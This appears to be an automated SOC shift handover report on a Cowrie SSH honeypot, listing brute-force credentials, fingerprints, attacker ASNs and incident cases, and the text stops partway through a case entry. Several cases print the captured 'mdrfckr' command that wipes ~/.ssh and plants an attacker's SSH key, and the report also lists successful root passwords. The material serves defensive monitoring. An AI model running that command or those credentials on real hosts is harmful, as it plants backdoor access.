# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-05 |
| **Generated At** | 2026-05-05T19:27:29Z |
| **Shift Time** | 19:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **244** |
| Confirmed Threats | **230** |
| False Positives Filtered | **14** (5.7%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **17** |
| High Severity Cases | **27** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **217** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **130** |
| Unique Credential Pairs | **98** |
| Unique Usernames | **43** |
| Unique Passwords | **94** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 29 |
| `root` | 27 |
| `345gs5662d34` | 14 |
| `test` | 5 |
| `ftpuser` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 13 |
| `password` | 3 |
| `111111` | 2 |
| `admin` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 13 |
| `ftpadmin` | `111111` | 2 |
| `nagios` | `admin123` | 2 |
| `ubuntu` | `Qwerty123.` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `test@admin` | `40.81.244.142` | 2026-05-05T17:29:16 |
| `root` | `3245gs5662d34` | `40.81.244.142` | 2026-05-05T17:29:17 |
| `root` | `admin_2024` | `45.196.236.141` | 2026-05-05T17:39:51 |
| `root` | `3245gs5662d34` | `45.196.236.141` | 2026-05-05T17:39:55 |
| `root` | `admin#2023` | `45.196.236.141` | 2026-05-05T17:44:00 |
| `root` | `admin2024@` | `45.196.236.141` | 2026-05-05T18:19:35 |
| `root` | `testing1` | `171.15.55.150` | 2026-05-05T18:34:01 |
| `root` | `admin!12345` | `185.92.182.129` | 2026-05-05T18:38:31 |
| `root` | `3245gs5662d34` | `185.92.182.129` | 2026-05-05T18:38:42 |
| `root` | `cmsadmin` | `101.32.1.25` | 2026-05-05T18:39:18 |
| `root` | `3245gs5662d34` | `101.32.1.25` | 2026-05-05T18:39:22 |
| `root` | `admin123456*` | `185.92.182.129` | 2026-05-05T18:51:12 |
| `root` | `admin159` | `185.92.182.129` | 2026-05-05T18:55:22 |
| `root` | `cmsadmin` | `68.183.236.1` | 2026-05-05T18:59:28 |
| `root` | `3245gs5662d34` | `68.183.236.1` | 2026-05-05T18:59:30 |
| `root` | `teste!@#` | `68.183.236.1` | 2026-05-05T19:00:23 |
| `root` | `admin@111` | `185.92.182.129` | 2026-05-05T19:01:27 |
| `root` | `vps123!@#` | `185.92.182.129` | 2026-05-05T19:03:30 |
| `root` | `testing1` | `68.183.236.1` | 2026-05-05T19:10:52 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **244** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 204 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 117 | 7 |
| `03a80b21afa8...` | Modern SSH client | 83 | 11 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 117 | 7 | libssh-based |
| `03a80b21afa8...` | libssh | 83 | 11 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.92.182.129`, `45.196.236.141`, `101.32.1.25`, `40.81.244.142`, `68.183.236.1`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **28** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS262460` | Ubannet Internet e Informatica Ltda ME | 1 | MEDIUM |
| `AS39431` | ArgoCom Ltd. | 1 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (27)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d9a27a92971a

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-05-05 17:29 |
| **Last Seen** | 2026-05-05 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:29:16` | `cowrie.session.connect` |
| `2026-05-05 17:29:16` | `cowrie.client.version` |
| `2026-05-05 17:29:16` | `cowrie.client.kex` |
| `2026-05-05 17:29:16` | `cowrie.login.success` |
| `2026-05-05 17:29:16` | `cowrie.session.params` |
| `2026-05-05 17:29:16` | `cowrie.command.input` |
| `2026-05-05 17:29:16` | `cowrie.command.failed` |
| `2026-05-05 17:29:16` | `cowrie.log.closed` |
| `2026-05-05 17:29:16` | `cowrie.session.params` |
| `2026-05-05 17:29:16` | `cowrie.command.input` |
| `2026-05-05 17:29:16` | `cowrie.session.file_download` |
| `2026-05-05 17:29:16` | `cowrie.log.closed` |
| `2026-05-05 17:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8126a05e6d0

| Field | Detail |
|---|---|
| **Source IP** | `40.81.244[.]142` |
| **First Seen** | 2026-05-05 17:29 |
| **Last Seen** | 2026-05-05 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:29:17` | `cowrie.session.connect` |
| `2026-05-05 17:29:17` | `cowrie.client.version` |
| `2026-05-05 17:29:17` | `cowrie.client.kex` |
| `2026-05-05 17:29:17` | `cowrie.login.success` |
| `2026-05-05 17:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.81.244[.]142` to AbuseIPDB if not already reported
- [ ] Block `40.81.244[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4c6ffd5f485

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-05-05 17:39 |
| **Last Seen** | 2026-05-05 17:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:39:51` | `cowrie.session.connect` |
| `2026-05-05 17:39:51` | `cowrie.client.version` |
| `2026-05-05 17:39:51` | `cowrie.client.kex` |
| `2026-05-05 17:39:51` | `cowrie.login.success` |
| `2026-05-05 17:39:52` | `cowrie.session.params` |
| `2026-05-05 17:39:52` | `cowrie.command.input` |
| `2026-05-05 17:39:52` | `cowrie.command.failed` |
| `2026-05-05 17:39:52` | `cowrie.log.closed` |
| `2026-05-05 17:39:52` | `cowrie.session.params` |
| `2026-05-05 17:39:52` | `cowrie.command.input` |
| `2026-05-05 17:39:52` | `cowrie.session.file_download` |
| `2026-05-05 17:39:52` | `cowrie.log.closed` |
| `2026-05-05 17:39:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8813a87f365

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-05-05 17:39 |
| **Last Seen** | 2026-05-05 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:39:55` | `cowrie.session.connect` |
| `2026-05-05 17:39:55` | `cowrie.client.version` |
| `2026-05-05 17:39:55` | `cowrie.client.kex` |
| `2026-05-05 17:39:55` | `cowrie.login.success` |
| `2026-05-05 17:39:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17063b703073

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-05-05 17:44 |
| **Last Seen** | 2026-05-05 17:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:44:00` | `cowrie.session.connect` |
| `2026-05-05 17:44:00` | `cowrie.client.version` |
| `2026-05-05 17:44:00` | `cowrie.client.kex` |
| `2026-05-05 17:44:00` | `cowrie.login.success` |
| `2026-05-05 17:44:01` | `cowrie.session.params` |
| `2026-05-05 17:44:01` | `cowrie.command.input` |
| `2026-05-05 17:44:01` | `cowrie.command.failed` |
| `2026-05-05 17:44:01` | `cowrie.log.closed` |
| `2026-05-05 17:44:01` | `cowrie.session.params` |
| `2026-05-05 17:44:01` | `cowrie.command.input` |
| `2026-05-05 17:44:01` | `cowrie.session.file_download` |
| `2026-05-05 17:44:01` | `cowrie.log.closed` |
| `2026-05-05 17:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47103969829a

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-05-05 17:44 |
| **Last Seen** | 2026-05-05 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 17:44:04` | `cowrie.session.connect` |
| `2026-05-05 17:44:04` | `cowrie.client.version` |
| `2026-05-05 17:44:04` | `cowrie.client.kex` |
| `2026-05-05 17:44:04` | `cowrie.login.success` |
| `2026-05-05 17:44:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53a4d51ab87

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-05-05 18:19 |
| **Last Seen** | 2026-05-05 18:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:19:35` | `cowrie.session.connect` |
| `2026-05-05 18:19:35` | `cowrie.client.version` |
| `2026-05-05 18:19:35` | `cowrie.client.kex` |
| `2026-05-05 18:19:35` | `cowrie.login.success` |
| `2026-05-05 18:19:36` | `cowrie.session.params` |
| `2026-05-05 18:19:36` | `cowrie.command.input` |
| `2026-05-05 18:19:36` | `cowrie.command.failed` |
| `2026-05-05 18:19:36` | `cowrie.log.closed` |
| `2026-05-05 18:19:36` | `cowrie.session.params` |
| `2026-05-05 18:19:36` | `cowrie.command.input` |
| `2026-05-05 18:19:37` | `cowrie.session.file_download` |
| `2026-05-05 18:19:37` | `cowrie.log.closed` |
| `2026-05-05 18:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe768cd9c82e

| Field | Detail |
|---|---|
| **Source IP** | `45.196.236[.]141` |
| **First Seen** | 2026-05-05 18:19 |
| **Last Seen** | 2026-05-05 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:19:39` | `cowrie.session.connect` |
| `2026-05-05 18:19:39` | `cowrie.client.version` |
| `2026-05-05 18:19:39` | `cowrie.client.kex` |
| `2026-05-05 18:19:39` | `cowrie.login.success` |
| `2026-05-05 18:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.196.236[.]141` to AbuseIPDB if not already reported
- [ ] Block `45.196.236[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-545b33e0d23c

| Field | Detail |
|---|---|
| **Source IP** | `171.15.55[.]150` |
| **First Seen** | 2026-05-05 18:33 |
| **Last Seen** | 2026-05-05 18:39 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:33:57` | `cowrie.session.connect` |
| `2026-05-05 18:33:57` | `cowrie.client.version` |
| `2026-05-05 18:33:57` | `cowrie.client.kex` |
| `2026-05-05 18:34:01` | `cowrie.login.success` |
| `2026-05-05 18:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.15.55[.]150` to AbuseIPDB if not already reported
- [ ] Block `171.15.55[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e93764c7a361

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 18:38 |
| **Last Seen** | 2026-05-05 18:38 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:38:28` | `cowrie.session.connect` |
| `2026-05-05 18:38:28` | `cowrie.client.version` |
| `2026-05-05 18:38:29` | `cowrie.client.kex` |
| `2026-05-05 18:38:31` | `cowrie.login.success` |
| `2026-05-05 18:38:33` | `cowrie.session.params` |
| `2026-05-05 18:38:33` | `cowrie.command.input` |
| `2026-05-05 18:38:33` | `cowrie.command.failed` |
| `2026-05-05 18:38:33` | `cowrie.log.closed` |
| `2026-05-05 18:38:34` | `cowrie.session.params` |
| `2026-05-05 18:38:34` | `cowrie.command.input` |
| `2026-05-05 18:38:34` | `cowrie.session.file_download` |
| `2026-05-05 18:38:34` | `cowrie.log.closed` |
| `2026-05-05 18:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0ec873cd2c

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 18:38 |
| **Last Seen** | 2026-05-05 18:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:38:39` | `cowrie.session.connect` |
| `2026-05-05 18:38:39` | `cowrie.client.version` |
| `2026-05-05 18:38:40` | `cowrie.client.kex` |
| `2026-05-05 18:38:42` | `cowrie.login.success` |
| `2026-05-05 18:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.92.182[.]129` to AbuseIPDB if not already reported
- [ ] Block `185.92.182[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ef140b56801

| Field | Detail |
|---|---|
| **Source IP** | `101.32.1[.]25` |
| **First Seen** | 2026-05-05 18:39 |
| **Last Seen** | 2026-05-05 18:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:39:17` | `cowrie.session.connect` |
| `2026-05-05 18:39:17` | `cowrie.client.version` |
| `2026-05-05 18:39:17` | `cowrie.client.kex` |
| `2026-05-05 18:39:18` | `cowrie.login.success` |
| `2026-05-05 18:39:18` | `cowrie.session.params` |
| `2026-05-05 18:39:18` | `cowrie.command.input` |
| `2026-05-05 18:39:18` | `cowrie.command.failed` |
| `2026-05-05 18:39:18` | `cowrie.log.closed` |
| `2026-05-05 18:39:19` | `cowrie.session.params` |
| `2026-05-05 18:39:19` | `cowrie.command.input` |
| `2026-05-05 18:39:19` | `cowrie.session.file_download` |
| `2026-05-05 18:39:19` | `cowrie.log.closed` |
| `2026-05-05 18:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.1[.]25` to AbuseIPDB if not already reported
- [ ] Block `101.32.1[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a4a86ab1bfb

| Field | Detail |
|---|---|
| **Source IP** | `101.32.1[.]25` |
| **First Seen** | 2026-05-05 18:39 |
| **Last Seen** | 2026-05-05 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 18:39:21` | `cowrie.session.connect` |
| `2026-05-05 18:39:21` | `cowrie.client.version` |
| `2026-05-05 18:39:21` | `cowrie.client.kex` |
| `2026-05-05 18:39:22` | `cowrie.login.success` |
| `2026-05-05 18:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.1[.]25` to AbuseIPDB if not already reported
- [ ] Block `101.32.1[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d95bf744d60

| Field | Detail |
|---|---|
| **Source IP** | `185.92.182[.]129` |
| **First Seen** | 2026-05-05 18:51 |
| **Last Seen** | 2026-05-05 18:51 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
